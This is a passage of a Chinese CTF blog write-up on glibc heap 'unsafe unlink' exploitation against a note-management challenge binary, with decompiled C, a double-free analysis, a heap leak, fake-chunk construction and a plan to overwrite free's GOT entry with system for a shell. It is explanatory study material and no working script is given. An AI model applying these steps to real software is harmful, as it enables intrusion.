class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= <span class="built_in">list</span>-&gt;max_number )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  --<span class="built_in">list</span>-&gt;now_number;</span><br><span class="line">  *(&amp;<span class="built_in">list</span>-&gt;struct_array.existence + <span class="number">3</span> * v1) = <span class="number">0LL</span>;</span><br><span class="line">  *(&amp;<span class="built_in">list</span>-&gt;struct_array.length + <span class="number">3</span> * v1) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;<span class="built_in">list</span>-&gt;struct_array.content + <span class="number">3</span> * v1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只对note_number是否在0-max–&gt;number之间进行了检验,没有检查note-&gt;existence是否有效,free之后也没有将note索引中的对应<strong>指针清空</strong>，也没有检查对应的索引中的<strong>是否存在位</strong>,因此存在double free;另外注意到将 flag 和 length 清零，而后 free 掉 buf ，<strong>没有置空指针</strong>，但是这个位只在edit函数中被校验，防止我们Use After Free</p>
+<h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>那么现在只有double  free漏洞可以利用我们就需要考虑还需要什么，程序开启了ASLR。我们不能获取libc的装载地址，但没有开启PIE，我们就可以获取got表的地址，可以通过double free漏洞然后接unlink来修改got表实现getshell.但是我们需要一个信息去读取地址</p>
+<p>注意到在建立新note的时候在note的结尾处没有加”\0″因此会造成堆或者栈的地址泄露</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40085D</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; i += v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (a1 + i), a2 - i);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>linux下块的结构如下图所示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105212234289.png" alt="image-20220105212234289"></p>
+<p>也就是说我们可以只输入8个字符，之前空闲状态的块的bk指针将不会被覆盖，而且当我们输出块的内容的时候则会将将它输出.</p>
+<p>当我们释放两个不相邻的大于等于0x80的块的时候（相邻会被合并，小于0x80会被并入fastbins，fastbins不是双向链表，而且在这个题目中最小的申请单位是0x80），将两个空块并入bins，如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/20190902233014831.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105223409450.png" alt="image-20220105223409450"></p>
+<p>两个块的bk指针是我们可以通过输出“带”出来的，左面块的bk指针指向右面块的地址，而块处在堆中，我们就可以知道右面块处在堆中的地址，根据计算我们就可以知道堆的起始地址。所以我们只需申请4个块，然后释放其中的第0和第2连个块，那么就会构造出一个这种场景，然后通过输出note0就可以带出note2的地址，那么根据栈结构就可以计算出栈起始地址：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105213710880.png" alt="image-20220105213710880"></p>
+<p>0x1820+0x90+0x90=0x1940，也就是说，note2对于堆起始地址偏移为0x1940</p>
+<p>上上个图右面块指向的是bins的索引，它处在main_arena中，具体的位置在libc中的malloc_hook字段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105220942298.png" alt="image-20220105220942298"></p>
+<p>也就是说，再之前init__函数中初始化申请的大小为0x1810的note索引中能找到指向note0的指针，但注意指针指向的位置是块内容开始的地方，也就是空块中fd的位置。而在检测中本应该指向的应该是块的开头，也就是presize的地方。所以我们要在这里伪造一个假的块：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105222108043.png" alt="image-20220105222108043"></p>
+<p>需要在之前申请的note0和note1都释放的状态下申请一个大小为note0+note1的块，然后内容如图中所构造。由于之前释放的note1的指针仍然存在，第二次释放note1就会引发unlink，而我们构造的fake fd和bk正好能通过检测，然后就会执行unlink：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk= P-&gt;bk</span><br><span class="line">P-&gt;bk-&gt;fd= P-&gt;fd</span><br></pre></td></tr></table></figure>
+
+<p>unlink后则为这样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105222242736.png" alt="image-20220105222242736"></p>
+<p>指向note0的指针改为了指向自己上面三个单位的地址，这时我们只要修改note0就会覆盖note0，比如我们将note0修改为p64(0)+p64(0)+p64(0)+p64(free_got)就会变成：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105222507126.png" alt="image-20220105222507126"></p>
+<p>然后修改got表中free为system，之后调用free直接变成system，则删除第0块就可以getshell</p>
+<p>漏洞的利用思路大致就是这些，但是写exp的时候没有打通，可能细节上存在一些问题。</p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/01/08/ciscn_2019/" title="ciscn">
+                    <div class="nextTitle">ciscn</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/01/08/secretHolder_hitcon_2016/" title="secretHolder_hitcon_2016">
+                    <div class="prevTitle">secretHolder_hitcon_2016</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unsafe-unlink"><span class="toc-number">1.</span> <span class="toc-text">unsafe_unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">unlink利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">unlink源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink%E5%AE%8F%E5%AE%9A%E4%B9%89"><span class="toc-number">1.3.</span> <span class="toc-text">unlink宏定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.</span> <span class="toc-text">大小检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A3%80%E6%9F%A5"><span class="toc-number">1.5.</span> <span class="toc-text">双向链表完整性检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A1%E8%B6%B3%E4%BB%A5%E4%B8%8A%E6%9D%A1%E4%BB%B6%E5%90%8E%EF%BC%8C%E8%BF%9B%E5%85%A5unlink%E8%84%B1%E9%93%BE%E7%8E%AF%E8%8A%82%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">满足以上条件后，进入unlink脱链环节：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%A5%E4%B8%BAlargebin-%E8%BF%98%E9%A1%BB%E8%BF%9B%E8%A1%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%93%8D%E4%BD%9C"><span class="toc-number">1.7.</span> <span class="toc-text">若为largebin,还须进行进一步操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#how2heap%E7%9A%84unlink%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">how2heap的unlink分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E5%AF%B9%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%9F%A5"><span class="toc-number">3.1.</span> <span class="toc-text">首先对程序进行检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5ida%E5%AF%B9%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">进入ida对函数进行分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">3.2.1.</span> <span class="toc-text">初始化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%87%BAnote%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">3.2.2.</span> <span class="toc-text">输出note信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%A2%9Enote"><span class="toc-number">3.2.3.</span> <span class="toc-text">新增note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9note"><span class="toc-number">3.2.4.</span> <span class="toc-text">修改note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4note"><span class="toc-number">3.2.5.</span> <span class="toc-text">删除note</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞利用思路</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span>
+            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span>
+            <a class="archive-post-title" href="/2022/03/15/libc-2.26/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span>
+            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span>
+            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span>
+            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span>
+            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
+                <span class="iconfont-archer">&#xe606;</span>
+                unsorted bin attack
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="house of spirit">
+                <span class="iconfont-archer">&#xe606;</span>
+                house of spirit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fastbin doule free">
+                <span class="iconfont-archer">&#xe606;</span>
+                fastbin doule free
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Diary">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Diary
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
